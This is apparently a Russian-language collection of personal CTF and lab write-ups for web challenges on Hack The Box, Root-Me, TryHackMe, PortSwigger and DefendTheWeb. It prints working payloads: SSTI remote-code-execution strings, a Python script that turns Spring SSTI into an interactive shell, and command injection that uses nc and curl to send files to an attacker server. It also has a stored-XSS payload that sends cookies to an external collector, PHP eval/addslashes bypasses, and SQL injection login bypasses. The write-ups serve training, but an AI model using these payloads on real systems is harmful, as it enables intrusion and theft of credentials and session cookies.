Первым шагом здесь было попробовать несколько разных маршрутов для этого URL-адреса и посмотреть, что вернется. Вы можете начать с использования инструмента, известного как «фаззер», который автоматизирует перебор множества различных общих маршрутов, чтобы увидеть, что вы можете найти. Однако, прежде чем мы прибегнем к специализированному инструменту, я всегда хотел бы попробовать несколько общих маршрутов. Конечно же, я смог получить что-то интересное, попробовав простой маршрут «/test».

![[Pasted image 20230212150934.png]]

Здесь мы видим, что введенный нами URL-адрес оказывается на странице в виде строки. Это довольно интересно, потому что мы знаем, что любые данные, вставленные на страницу, скорее всего, поступают из Python. Поэтому это может быть отличным местом, чтобы начать вставлять некоторый код Python, чтобы посмотреть, сможем ли мы получить выполнение кода. Опять же, если вы не знакомы с механизмами шаблонов Python, код Python обычно вставляется с использованием специального «синтаксиса», чтобы отметить, что код должен выполняться Python. В случае Jinja используется синтаксис «{{}}», где все, что находится внутри двойных фигурных скобок, будет оцениваться python перед тем, как появится в HTML-коде веб-страницы. Вооружившись этими знаниями, мы можем использовать мой любимый инструмент [CyberChef](https://gchq.github.io/CyberChef/) для создания закодированных строк URL. Таким образом, данные, которые мы хотим отправить, не будут неверно истолкованы.

![[Pasted image 20230212150949.png]]

Здесь мы видим, что мы просто пытаемся протестировать простой математический расчет, чтобы увидеть, можем ли мы заставить сервер Python что-то делать. Конечно же, мы видим ответ, который мы ищем! Сервер оценил от 7*7 до 49.

![[Pasted image 20230212150959.png]]

Ну что, посчитали? Хотя поначалу это кажется не таким уж большим, теперь мы можем использовать эту возможность для доступа к некоторым из наиболее интересных областей Python. Например, если мы изменим наше математическое уравнение на поиск следующего:

```
{{config.items()}} 
```

Затем мы получаем действительно хороший ответ:

![[Pasted image 20230212151018.png]]

Это связано с настройкой по умолчанию для Flask, которая предоставляет объект конфигурации для веб-приложений. Подробнее об этом можно прочитать в [документации Flask](https://flask.palletsprojects.com/en/2.0.x/api/?highlight=config#flask.Config) . Однако, выполнив вызов функции для получения всех элементов объекта конфигурации, как показано выше, мы можем увидеть всевозможную информацию об этом приложении. Это может включать в себя такие вещи, как секретный ключ, который можно использовать для поддельной аутентификации с этим приложением. Если это не достаточно опасно, так же легко изменить конфигурацию самого приложения! Пример этого может выглядеть примерно так:

```
config.update(  
    TESTING=True,  
    SECRET_KEY='pwnd'  
)
```

Теперь мы начинаем понимать, насколько опасной может быть эта уязвимость, но давайте продвинемся немного дальше, чтобы выполнить задачу. Чтобы исследовать глубины этой опасной зоны, нам нужно найти специальный класс в python, у которого есть функция под названием «Popen». Эта функция не только даст нам выполнение кода в python, но фактически позволит нам запустить любую указанную команду на самом хост-компьютере и вернуть результаты (да)! Эта функция немного скрыта, но вот как ее найти.

Во-первых, мы можем использовать пустую строку «», чтобы получить доступ к атрибуту «__class__». Затем этот атрибут «__class__» имеет специальный атрибут «__mro__», который сам содержит список объектов. Мы можем получить доступ ко второму объекту, используя индекс 1, а затем вызвать метод «__subclasses__» для этого объекта. Ого, это было много, но если вы справились, вы можете увидеть, как это выглядит ниже:


![[Pasted image 20230212151115.png]]

Вставка этого в наш браузер вернет массивный результат с сотнями подклассов, обеспечивающих различные функции. Как было сказано ранее, мы ищем «Popen».

Из-за количества результатов легче сузить результаты, используя фрагмент списка, как показано ниже. Здесь мы должны вернуть все по индексу 400 в конец списка.

![[Pasted image 20230212151131.png]]

Наконец, мы видим, что «Popen» находится в индексе 414.

![[Pasted image 20230212151140.png]]

Теперь, когда мы знаем, где находится эта функция, мы можем использовать Cyberchef для создания полезной нагрузки URL, которая должна предоставить нам доступ к самой хост-машине!

![[Pasted image 20230212151155.png]]

Все, что нам нужно здесь сделать, это перечислить все файлы в текущем каталоге и посмотреть, что вернется. Введя это в URL-адрес, мы получим следующее:

![[Pasted image 20230212151206.png]]

Мы видим, что все каталоги и файлы на этой машине перечислены для нашего удобства, хотя и не очень удобно для чтения. Теперь мы можем свободно просматривать любые данные на этой машине, и, если вы заметили, есть файл с именем «flag.txt». Чтобы выполнить нашу задачу, все, что нам нужно сделать, это использовать команду «cat», чтобы прочитать файл и захватить этот флаг!

![[Pasted image 20230212151222.png]]

![[Pasted image 20230212151228.png]]

Конечно, я не собираюсь вывешивать настоящий флаг; Вы можете решить эту задачу и получить флаг для себя! Тем не менее, я надеюсь, что вы узнали некоторые полезные приемы из этой статьи. Следите за новостями о Hack The Box!

---
## RedPanda

**Платформа:** https://www.hackthebox.com/
**Уровень:** Easy

В этой статье, на примере уязвимой машины Hack The Box RedPanda, будем эксплуатировать уязвимость SSTI с шаб­лониза­тором Spring.

Эксплуатация уязвимости SSTI с шаб­лониза­тором Spring. Итак, у нас есть страница с поль­зователь­ским вводом.

![[Pasted image 20230212154916.png]]

Для начала можно поп­робовать различные типы инъ­екций. Для перебора, будем использовать Burp Intruder.

![[Pasted image 20230212154932.png]]

После неудачных попыток инъ­екции опе­рато­ров SQL, переходим к поиску уязвимости  SSTI.

**Уязвимость SSTI

Server-Side Template Injection (SSTI), или инъ­екция шаб­лонов на сто­роне сер­вера, — это техника ата­ки, при которой хакер внед­ряет в шаб­лон вре­донос­ный код. Шаб­лоны необходимы веб‑раз­работ­чикам, что­бы мож­но было нас­тра­ивать внеш­ний вид сай­та толь­ко в одном мес­те и затем не копиро­вать вруч­ную.

Простыми словами, шаб­лон — это документ HTML, где в определенных мес­тах отме­чены перемен­ные и коман­ды, которые при генера­ции ито­говой стра­ницы должны быть замене­ны дан­ными. В том чис­ле это могут быть и дан­ные, которые получают от посети­теля сай­та.

Ата­ка зат­рагива­ет момент, ког­да полученная информа­ция объ­еди­няет­ся с шаб­лоном. Хакер фор­миру­ет стро­ку таким обра­зом, что­бы она не прос­то под­ста­вилась в шаб­лон, но была интер­пре­тиро­вана как код. Если это получается, то он добавит свои дирек­тивы, с помощью которых выпол­нит [эксфиль­тра­цию дан­ных](https://spy-soft.net/exfiltrate-data-over-screen-interfaces/) или даже зах­ват веб‑сер­вера.

Пер­вым делом нуж­но опре­делить исполь­зуемый шаб­лониза­тор, для чего я переби­раю раз­ные вари­анты по сло­варю.

![[Pasted image 20230212154954.png]]

И мы видим выпол­нение выраже­ния 7*7 при исполь­зовании шаб­лона *{}, харак­терно­го для Java-фрей­мвор­ка Spring. Что­бы получить уда­лен­ное выпол­нение кода (RCE) через Spring SSTI, исполь­зуем сле­дующую наг­рузку.

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

В интернете полезных нагрузок просто завалом, вы можете использовать другой из них. 

![[Pasted image 20230212155205.png]]

**Точка опоры**

У нас есть RCE, но при попыт­ке выпол­нить некото­рые дей­ствия, к при­меру получить или записать SSH-ключ, мы получа­ем ошиб­ку, что сим­волы филь­тру­ются.

```
curl http://10.10.11.170:8080/search -d 'name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("curl http://10.10.14.23/id_rsa.pub -o /home/woodenk/.ssh/authorized_keys").getInputStream())}'
```

![[Pasted image 20230212155319.png]]

Ошиб­ка при записи SSH-клю­ча

Сер­вер жалу­ется на невер­ные сим­волы. Давай тог­да закоди­руем вво­димую коман­ду, что­бы избе­жать их. Для сос­тавле­ния наг­рузки мы будем исполь­зовать вот такой генера­тор:

```
T(java.lang.Character).toString(<...>).concat(T(java.lang.Character).toString(<...>)).concat(...
```

Я написал на Python прос­той кодер команд:

```
import sys

data = sys.argv[1]

payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(" + str(ord(data[0])) + ")"

for i in data[1:]:

   payload += ".concat(T(java.lang.Character).toString(" + str(ord(i)) + "))"

payload += ").getInputStream())}"

print("curl http://10.10.11.170:8080/search -d 'name=" + payload + "'")
```

От­даем скрип­ту коман­ду id и получа­ем коман­ду curl с наг­рузкой.

![[Pasted image 20230212155428.png]]

Соз­дание наг­рузки

```
curl http://10.10.11.170:8080/search -d 'name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}'
```

![[Pasted image 20230212155516.png]]

Ре­зуль­тат выпол­нения коман­ды на сер­вере

И мы видим вывод коман­ды и поль­зовате­ля, от име­ни которо­го она выпол­няет­ся. Давай поп­робу­ем соз­дать каталог .ssh и записать в него ключ SSH. Одна­ко при под­клю­чении у нас все рав­но зап­рашива­ют пароль.

```
mkdir /home/woodenk/.ssh
curl 10.10.14.23/id_rsa.pub -o /home/woodenk/.ssh/authorized_keys
chmod 0600 /home/woodenk/.ssh/authorized_keys
```

![[Pasted image 20230212155546.png]]

Под­клю­чение к SSH

Так получит­ся работать толь­ко через RCE, поэто­му приш­лось прев­ратить наш генера­тор в более‑менее удоб­ный шелл.

```
import requests

while True:

   inp = input("CMD > ")

   payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(" + str(ord(inp[0])) + ")"

   for i in inp[1:]:

       payload += ".concat(T(java.lang.Character).toString(" + str(ord(i)) + "))"

   payload += ").getInputStream())}"

   data = {"name": payload}

   r = requests.post("http://10.10.11.170:8080/search", data=data)

   q_start = r.content.decode().index("You searched for:") + 18
   q_end = r.content.decode().index("</h2>")

   print(r.content.decode()[q_start:q_end])
```


![[Pasted image 20230212155634.png]]

Тес­тирова­ние шел­ла

Мы разобрались с эксплуатацией уязвимости SSTI с шаб­лониза­тором Spring. В следующей статье, в рамках задания Hack The Box RedPanda, будем [эксплуатировать уязвимость XXE](https://spy-soft.net/xxe-vulnerability-exploitation/).

---

# [[command-injection|RCE]]

## Command injection - Filter bypass

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Сегодня разберём задачу "Command injection - Filter bypass".

![[Pasted image 20230108114412.png]]

Это задания является второй версией уже разобранного задания на канале. Но судя по описанию, в данном задании добавились защиты. Перейдём по ссылке и попробуем внедрить свои команды.

![[Pasted image 20230108114435.png]]

Тот-же интерфейс и логика. Команда ping с введённым нами аргументом, попробуем сделать стандартные инжекты.

![[Pasted image 20230108114456.png]]

Получаем "Syntax Error". Попробуем ещё варианты.

После нескольких десяток попыток что-то проинжектить результатов особо нет. Всё фильтруется. Однако можно накопать вот такой пейлоад.

![[Pasted image 20230108114524.png]]

```
ip = <some-valid-ip> %0a ls
```

Мы подставляем верный ip-адрес, после чего передаём символ перевода строки и как-бы вызываем ещё одну команду, однако её вывод мы к сожалению не увидим, но она выполняется.

Подтвердить это можно имея сервер с белым ip-адресом. Просто откроем на нём порт и подключимся через инжект команды по nc.

![[Pasted image 20230108114651.png]]

Тут уже можно понять, что мы можем делать обращения на ресурсы и с помощью данных обращений производить какие-либо действия. 

Самый простой вариант это отправить файл index.php на наш сервер.

Для этого можно просто сделать curl запрос вида.

![[Pasted image 20230108114847.png]]

При этом порт должен быть открыт на нашей машине.

![[Pasted image 20230108114901.png]]

Отправляем нашу команду и получаем скрипт к себе на сервер, а в скрипте флаг.

Задание было достаточно интересным, однако если у вас нет своего выделенного сервера, скорей всего вы его не решите, хотя возможно есть бесплатные сервера, но я не уверен на счёт того, возможно ли вам будет открывать там порты и прочее. Так или
иначе завести выделенный сервер полезно.

---

## PHP assert()

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Сегодня разберём задачу "PHP assert()".

![[Pasted image 20230108113018.png]]

Итак, нам надо найти уязвимость и прочитать файл ".passwd". В описании нам говорят читать документацию. Зайдём на сайт и посмотрим, что нам предлагается.

![[Pasted image 20230108113036.png]]

Форм ввода нет, но есть ссылки на верхнем меню, попробуем нажать одну из.

![[Pasted image 20230108113049.png]]

Видим, что установился параметр "?page" попробуем сделать Path Traversal и подняться выше.

![[Pasted image 20230108113125.png]]

И видим, что здесь есть фильтрация через выражения (функция assert).

Посмотрим на это выражение повнимательнее.

![[Pasted image 20230108113150.png]]

Итак, мы можем заметить, что наши данные подставляются в функцию strpos. То есть примерное выражение в коде, скорей всего выглядит так.

![[Pasted image 20230108113211.png]]

Мы можем попробовать закрыть функцию strpos, и вызвать свою. Вызвать функцию мы можем, потому-что по документации assert производит по сути eval() того, что было передано, это также можно понять и потому, что внутри assert идёт вызов функции strpos.

![[Pasted image 20230108113241.png]]

Создаём такой хитырй пейлоад и попробуем его передать на сервер.

![[Pasted image 20230108113255.png]]

Отлично, пейлоад сработал. Чтобы понять его работу, просто попробуйте подставить его в выражение и всё поймёте.
Пароль получен, задание решено.

Функция assert частенько используется для проверки тех или иных условий, знание её особенностей работы может позволить получить выполнение команд на сервере.

Всегда смотрите на ошибки от сервера и аккуратно пользуйтесь данной функцией, если вы пишете на PHP.

---

## PHP - Command injection

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Ссылка на задание - https://www.root-me.org/en/Challenges/Web-Server/Command-injection

Из описания и названия берём самое важно и получаем, что речь пойдёт об "внедрении команд", пароль хранится в файле index.php

![[Pasted image 20230107181911.png]]

Заходим на сайт и видим следующую форму.

![[Pasted image 20230107181938.png]]

Нужно найти пароль в файле index.php. Нам предлагается форма, куда мы должны вставить ip адрес. В описании задания было сказано, что это сервис, предназначенный для пинга. Предположим, что пинг реализуется с помощью системной функции и фильтрация вводимых данных - отсутствует. Простыми словами, он передается в командную строку и выполняется пинг. Давайте передадим цепочку команд. Данная уязвимость относится к классу RCE, описание уязвимости уже было на канале и пример был практически такой-же. Вот ссылки на описание RCE:

![[Pasted image 20230107182042.png]]

Подаём на вход следующую строку "; cat index.php", суть которой заключается в том, что мы закрываем команду ping и добавляем ещё одну команду, которая прочитает файл index.php и отобразит его.

![[Pasted image 20230107182117.png]]

После выполнения будет отображено 2 формы ввода - это нормально, так как мы прочитали файл и отобразили его, а он содержит не только php-код но и html-код, который повторно отображается. Нам нужно открыть исходный код.

![[Pasted image 20230107182152.png]]

Видим серверную часть кода, в которой и расположен наш флаг/пароль для решения задания.

---

## LoveTok

**Платформа:** https://www.hackthebox.com/
**Уровень:** Easy

![[Pasted image 20230205160912.png]]


Когда мы попадаем на страницу, мы видим гифку, какой-то текст, таймер и кнопку.

Когда мы нажимаем на кнопку, URL меняется:

![[Pasted image 20230205161251.png]]

Что, если мы изменим это r на что-то другое? Например, «привет».

![[Pasted image 20230205161321.png]]

![[Pasted image 20230205161330.png]]

Текст изменен!

![[Pasted image 20230206132239.png]]

Я наткнулся на это утверждение if в router.php файл, и он проверяет наличие строк.Если uri содержит его, мы получаем сообщение об ошибке.

Теперь давайте еще раз проверим код из загруженных файлов.

```php
<?php
class TimeModel
{
public function __construct($format)
{ 
$this->format = addslashes($format);

[ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
$this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
}

public function getTime()
{
eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
return isset($time) ? $time : 'Something went terribly wrong';
}
}
```

Метод getTime() вызывается при передаче переменной 'format' сценарию, например:

```
http://167.71.143.20:30143/?format=input
```

Проблема заключалась в том, что когда что-то проходит через свойство $this->format, оно фактически фильтруется через addlashes().

Теперь вернемся к сайту.

Что мы можем написать вместо 'r', чтобы мы получили веб-шелл?

что такое веб-шелл и зачем он нам нужен?

веб-оболочка — это скрипт, который позволяет нам получить доступ к удаленной оболочке операционной системы веб-сервера. В этом случае он нам нужен, чтобы мы могли получить флаг, который находится в системе веб-сервера.


Итак, у нас было два варианта:

1.  Либо попробуйте обойти **ограничение кавычек addlashes()**
2.  Переобъявим другую переменную самостоятельно, которая не проходит через **php-функцию addlashes()** .

Попробовав разные вещи, которые, похоже, не сработали, я нашел следующую статью об [[Использование сложных переменных для обхода функции addlashes для достижения RCE | использовании сложных переменных для обхода функции addlashes для достижения RCE]].  Начальная полезная нагрузка, сформированная из данных из статьи выше, выглядит следующим образом:

```
http://167.71.143.20:30143/?format=${eval($_GET[1])}&1=system(ls); 
```

Поскольку **переменная 1** на самом деле является самоопределяемой и проходит через **eval** , ее результат анализируется и ссылается на функцию eval php в исходном коде задачи и фактически не проходит через **функцию addlashes()** , по крайней мере, не напрямую. Таким образом, мы могли бы использовать кавычки в нашей переменной, ссылающейся на себя, и следующим образом:

```
http://167.71.143.20:30143/?format=${eval($_GET[1])}&1=system('ls%20../');
```

```
 Parameter: ${system($_GET[cmd])}&cmd=ls
 
 Its same as ${system($_GET[ls])}
 ```

![[Pasted image 20230206132749.png]]


**Эксплуатация**

**Способ 1:**


![[Pasted image 20230206133446.png]]

Мы получили имя флага!! В моем случае имя файла флага - flagmRG8b. Но у вас будет по-другому. Давайте получим этот флаг командой:

![[Pasted image 20230206133511.png]]

**Способ 2**

После решения проблемы я задался вопросом, есть ли более короткий путь к удаленному выполнению кода без необходимости использования функции eval. Первоначально моя идея состояла в том, чтобы попробовать какой-то шестнадцатеричный ввод, который будет проанализирован как строка, что привело меня к следующим рабочим **нагрузкам обхода ограничений addlashes** :

```
http://167.71.143.20:30143/?format=${system(chr(105).chr(100))} <--- system(id)
```

```
http://167.71.143.20:30143/?format=${system(hex2bin(6964))} <-- system(id)
```

```
http://167.71.143.20:30143/?format=${system(chr(117).chr(110).chr(97).chr(109).chr(101).chr(32).chr(45).chr(97))} <-- uname -a
```

```
http://167.71.143.20:30143/?format=${system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103).chr(42))} <-- flag
```

![[Pasted image 20230206133641.png]]

**Способ 3**

Самый простой и самый короткий способ:

```
http://167.71.143.20:30143/?format=${print(`id`)}
http://167.71.143.20:30143/?format=${print(`cat /flag*`)}
```

**Заключение**

Существуют различные **способы обойти** фильтр ограничений addlashes(), когда пользовательский ввод предоставляется **php-функции eval()** . Возможна даже более широкая **поверхность атаки** , поскольку **описанный выше обход полезной нагрузки ограничения addlashes** может быть применим к другим типам атак в некоторых конкретных случаях, таких как **SQL Injection** атака .



---

# [[XSS|XSS]] 

## Be Careful with what you Wish on a Christmas Night

**Платформа:** https://tryhackme.com/
**Уровень:** Easy
**Комната**: [Advent of Cyber 2](https://tryhackme.com/room/adventofcyber2)

_В этом году Санта захотел перейти на полностью цифровой формат и изобрел программу «Загадай желание!» система. Это чрезвычайно простое веб-приложение, которое позволит людям анонимно делиться своими желаниями с другими. К сожалению, сразу после хакерской атаки служба безопасности обнаружила, что кто-то взломал приложение «Загадай желание!». Большая часть желаний исчезла, и сайт теперь перенаправляется на вредоносный сайт. Злоумышленник мог притвориться, что отправил желание, и отправить на сервер вредоносный запрос! Команда безопасности подключила для вас резервный сервер на_ `_MACHINE_IP:5000_`_. Ваша цель — найти способ, которым злоумышленник мог воспользоваться приложением._

![[Pasted image 20240814064945.png]]

Вот страница с резервного сервера, которую мы можем изучить:

![[Pasted image 20240814065046.png]]


**Вопрос №2 Какой тип уязвимости использовался для эксплуатации приложения?**

Я собираюсь начать с открытия OWASP Zap и выполнения автоматического сканирования:

![[Pasted image 20240814065116.png]]

После завершения сканирования вы можете проверить вкладку предупреждений, чтобы узнать, было ли что-нибудь найдено. Здесь мы видим два оповещения XSS:

![[Pasted image 20240814065132.png]]

Интересно, что ни «Постоянный межсайтовый скриптинг», ни «Отраженный межсайтовый скриптинг» не работали, когда я вводил ответ, поэтому я фактически использовал « **Сохраненный межсайтовый скриптинг** ».

Этот конкретный XSS упоминался в материалах как тип, который можно использовать в комментариях, например, на веб-странице желаний.

**Вопрос №3. Какой строкой запроса можно злоупотребить для создания отраженного XSS?**

Если вы введете желание, вы увидите множество всплывающих окон с подтверждением XSS.

![[Pasted image 20240814065309.png]]

Просматривая все записи, вы увидите, что строка запроса « **q** » используется несколько раз через функцию поиска:

![[Pasted image 20240814065328.png]]

Отправив собственный поисковый запрос, вы можете подтвердить это:

![[Pasted image 20240814065340.png]]

**Вопрос № 5. Запустите автоматическое сканирование цели ZAP (zaproxy). Сколько оповещений XSS находится в сканировании?**

Похоже, мы уже ответили на этот вопрос выше, это было **2**.

![[Pasted image 20240814065408.png]]



---
## XSS Stored

**Платформа:** https://www.root-me.org/
**Уровень:** Easy


![[Pasted image 20230108214106.png]]

По заданию нам нужно захватить куки администратрора. Открываем сайт. Видим форму, где нужно ввести заголовок и сообщение. Введем, чтобы посмотреть, как наш ввод отобразится на форме.

![[Pasted image 20230108214125.png]]

![[Pasted image 20230108214131.png]]

Так. Попробуем проверить на XSS. В качестве пэйлоада я буду испольовать обычный алерт.

```
<script>alert(1);</script>
```

Как можно видеть, нам отобразилось окошко алерта, то есть внедренный код javascript сработал.

![[Pasted image 20230108214220.png]]

Так как это хранимые XSS, то есть возможность угнать куки других пользователей. Если у вас нету своего собственного сервера в глобальной сети, то можно воспольоваться этим сайтом.

![[Pasted image 20230108214250.png]]

Здесь нам дают адрес, по которому мы сможем наблюдать все запросы на этот адрес. Теперь внедрим следующий пэйлоад.

```js
<script>document.write("<img src='https://en0q0bu21ne0wq.x.pipedream.net/?cookie=" + document.cookie + "'></img>");</script>
```

Когда пользовательоткроет страницу с этим кодом, агент попытается загрузить картинку и выполнит запрос по данному адресу. В качестве параметра он будет использовать свой куки. Мы же потом посмотрим на параметр, с которым пришел запрос — это и будет куки.

![[Pasted image 20230108214335.png]]

Чем опасен угон куки? Вставив куки для этого сайта в своем браузере мы войдем на сайт от имени этого пользователя, пропустив процесс аутентификации.

## XSS - Server Side

**Платформа:** https://www.root-me.org/
**Уровень:** Easy




---
# [[Personal Knowledge Base/SECTIONS/20. CyberSec/21. CTF/Write-Ups/01. Web/00. PossibleThreats/SQL Injection/sql-injection|SQL Injection]]

## Portswigger: Lab №1 

**Платформа:** https://portswigger.net
**Уровень:** Easy

**Описание:** Уязвимость SQL-инъекции в предложении WHERE, позволяющая извлекать скрытые данные.

Это приложение для покупок, которое отображает товары в разных категориях (выпущенные и невыпущенные). Чтобы контролировать видимость выпущенных или не выпущенных продуктов, приложение использует поле ограничения со значением 1 или 0. 

Когда пользователь нажимает на категорию «Подарки», его браузер запрашивает URL-адрес:

```
https://<id>.web-security-academy.net/filter?category=Gifts
```

Это заставляет приложение выполнять SQL-запрос для получения сведений о соответствующих продуктах из базы данных:

```sql
SELECT * FROM products WHERE category = ‘Gifts’ AND released = 1
```

После выполнения запроса база данных проверяет каждую строку в таблице продуктов, извлекает каждую запись, в которой столбец категории имеет значение «Gifts», а «released» имеет значение 1, и возвращает результирующие записи. Затем приложение обрабатывает этот набор записей и представляет его пользователю на HTML-странице.

Вы можете использовать Burp Suite для перехвата запроса GET и наблюдения за разными результатами для разных тестовых случаев.

![[Pasted image 20240429230537.png]]

Ограничение выпущено = 1 используется для сокрытия невыпущенных продуктов. Поэтому, Приложение отображает только 3 товара.

Эта лабораторная работа содержит уязвимость внедрения SQL в фильтре категорий продуктов. Когда пользователь выбирает категорию, приложение выполняет SQL-запрос, подобный следующему:

```sql
SELECT * FROM products WHERE category = ‘Gifts’ AND released = 1
```

Чтобы решить эту задачу, нам нужно отобразить один или несколько невыпущенных продуктов. и учитывая, что в фильтре категорий продуктов есть уязвимость SQLi. 

Поскольку приложение не реализует никакой защиты от SQL-инъекций, вы можете построить атаку следующим образом.

```
https://<id>.web-security-academy.net/filter?category=Gifts'--
```

![[Pasted image 20240430070549.png]]

Это заставляет приложение выполнять следующий SQL-запрос

```sql
SELECT * FROM products WHERE category = ‘Gifts’--‘ AND released = 1
```

Это эффективно удаляет оставшуюся часть запроса, поэтому он больше не включает **AND Release = 1** . Это означает, что отображаются все продукты, включая невыпущенные. Поэтому,

_Приложение отображает 4 продукта, включая один невыпущенный продукт._

Двойной дефис (- -) во входных данных — это значимое выражение SQL, которое сообщает интерпретатору запросов, что оставшаяся часть строки является комментарием и ее следует игнорировать. Этот трюк чрезвычайно полезен при некоторых атаках с помощью SQL-инъекций, поскольку позволяет игнорировать остальную часть запроса, созданного разработчиком приложения.

**Комментарий**

Приложение инкапсулирует введенную пользователем строку в одинарные кавычки. Поскольку злоумышленник завершил строку, которой он управляет, ему необходимо обработать конечную кавычку, чтобы избежать синтаксической ошибки. Он достигает этого, добавляя двойной дефис, в результате чего оставшаяся часть запроса рассматривается как комментарий.

Поэтому сначала выберите категорию Lifestyle и посмотрите на URL. Мы видим, что фильтр категорий был добавлен как **category=Lifestyle**:

![[Pasted image 20240429231347.png]]

```sql
SELECT * FROM products WHERE category = 'Lifestyle' AND released = 1
```

Злоумышленник может заставить приложение отображать все продукты независимо от категории и установленных ограничений следующим образом:

```
https://<id>.web-security-academy.net/filter?category=Gifts' OR ​​1=1--
```

![[Pasted image 20240430070959.png]]

Бинго!

Здесь условие «1=1» всегда принимает значение true, а символ «--» закомментирует остальную часть SQL-запроса, что позволит нам получить все выпущенные и невыпущенные продукты, независимо от их категории.

Простыми словами мы используем двойной дефис чтобы закомментировать остальную часть запроса и получить скрытые данные. Мы можем сделать это, просто добавив **category=' OR 1=1--'**

Запрос будет следующим:

```sql
SELECT * FROM products WHERE category = '' OR 1=1
```

![[Pasted image 20240429231522.png]]

---

## Portswigger: Lab №2

**Платформа:** https://portswigger.net
**Уровень:** Easy

**Описание задания**: В этой лабораторной работе обнаружена уязвимость SQL-инъекции в функции входа в систему. Для решения лабораторной работы выполните атаку с использованием SQL-инъекции, которая войдет в приложение как пользователь `administrator`.

**наша конечная цель** — войти в систему как администратор

![[Pasted image 20240706011758.png]]

Сайт выглядит как сайт покупок и имеет страницу входа

![[Pasted image 20240706011808.png]]

и он запрашивает имя пользователя и пароль для входа, и сначала попробуйте с именем пользователя = admin, паролем = admin

![[Pasted image 20240706011837.png]]

и мы получили ошибку, в которой говорится: «неверное имя пользователя и пароль». Тогда давайте попробуем использовать уязвимость SQLI, добавив один cot в поле имени пользователя

![[Pasted image 20240706011931.png]]

![[Pasted image 20240706011947.png]]

Мы видим, что он генерирует страницу « _Внутренняя ошибка сервера_ ». Так что, как мы предполагаем, он работает над приведенным ниже SQL-запросом.\

```sql
SELECT username FROM users WHERE username=’name’ AND password=’pass’
```

Итак, мы попробуем ввести ( _administrator' — —_ ) в поле имени пользователя. Двойной дефис укоротит SQL-запрос. Тогда запрос не будет проверять условие пароля.

![[Pasted image 20240706012044.png]]

На сервер отправляется вот такой запрос:

```sql
SELECT username FROM users WHERE username=’administrator'--’ AND password=’pass’
```

То есть пароль не проверяется.

![[Pasted image 20240706012201.png]]

Вуаля, сработало. Видим, что нам удалось войти в учетную запись администратора. Следовательно, лабораторная работа успешно решена.

---

## SQLi 1

**Платформа:** https://defendtheweb.net/
**Уровень:** Easy

![[Pasted image 20240729021239.png]]

Так тут нужно обойти проверки пароля. Давайте в качестве имя пользователя введём admin в качестве пароля 12345.

![[Pasted image 20240729021744.png]]

Ну ка папробуем в качестве имя пользователя `admin'` .

![[Pasted image 20240729021900.png]]

На странице пояявляется лог с ошибкой в которой показывается структура запроса

```sql 
SELECT * FROM users WHERE username = 'admin'' AND password = '12345'
```

Мы можем обойти проверку пароля с п.м. вот такого просто запроса:

- Username: `admin' or 1=1 --`
- Password: `ANY`

Теперь запрос выглядит вот так:

```sql
SELECT * FROM users WHERE username = 'admin' or 1=1 --' AND password = '12345'
```

![[Pasted image 20240729022229.png]]
## SQLi 2

**Платформа:** https://defendtheweb.net/
**Уровень:** Easy


![[Pasted image 20240724122105.png]]

Поиск уязвимости — первый шаг к решению проблемы. В данном случае уязвимостью является SQL-инъекция, позволяющая обойти аутентификацию и получить доступ к веб-сайту, вставив вредоносный SQL-код в форму входа.

Затем имена пользователей перечисляются с помощью URL с полезной нагрузкой SQL Injection. Введите следующую полезную нагрузку в URL, чтобы сделать это:

```
https://defendtheweb.net/playground/sqli2?q=A>' OR 1 --
```

Когда мы отправляем некорректный запрос, мы можем посмотреть на ошибку:

```sql
'UNION+SELECT+NULL--
```

Ответ:

```sql
DEBUG: SELECT username, admin FROM members WHERE username LIKE 'C'UNION SELECT NULL --%'
```

Допустим мы узнали что в запросе используется два столбца, сначала нужно узнать какой столбец выводится на странице:

```sql
'UNION+SELECT+1,2--
```

На страница появился  `1`, значит первый столбец выводится, а второй нет.  Поскольку на странице выводится только первый столбец, используем его для вывода информации. Теперь определим кто из пользоватей в спсике является админом:

```sql
'UNION SELECT username,NULL FROM members WHERE admin=1-- 
```

Второй столбец просто `NULL` потому что он и так не выводится.  Или можно просто коротко:

```sql
' OR admin = 1 --
```

Находим что админом является **bellamond**.  Теперь извлекаем его пароль:

```sql
'UNION SELECT password,NULL FROM members WHERE admin='1'--
```

Получаем хэш. теперь взломайте хэш м получите пароль ;) 

В итоге получается логин  **bellamond** и пароль **sup3r**.
## Portswigger: Lab №3

**Платформа:** https://portswigger.net
**Уровень:** Easy

**Описание задания**:  Эта лаборатория содержит уязвимость [SQL-инъекции](https://portswigger.net/web-security/sql-injection) в фильтре категории продукта. Вы можете использовать атаку UNION для получения результатов из внедренного запроса.

Для решения лабораторной работы отобразите строку версии базы данных.

**Подсказка**

В базах данных Oracle каждое `SELECT`выражение должно указывать таблицу для выбора `FROM`. Если ваша `UNION SELECT`атака не запрашивает данные из таблицы, вам все равно нужно будет включить `FROM`ключевое слово, за которым следует допустимое имя таблицы.

В Oracle есть встроенная таблица, которая называется `dual`, которую вы можете использовать для этой цели. Например:`UNION SELECT 'abc' FROM dual`


И так что мы имеем:

- Базу данных Oracle
- Таблицу dual

Нам нужно через таблицу dual вывести версию базы данных. Для начала нужно определить количество столбцов таблицы чтобы отправить корректный запрос.

**Определения колчиество столбцов**

```sql
' order by 3 --  
```

- Result: **500 Internal Server Error**

Если получаем ошибку от сервера, то это значит мы не правильно задали индекс столбца, выполнять нужно до тех пор пока сервер не выполнить запрос корректно.

```sql
' order by 2 --
```

![[Pasted image 20240711080308.png]]

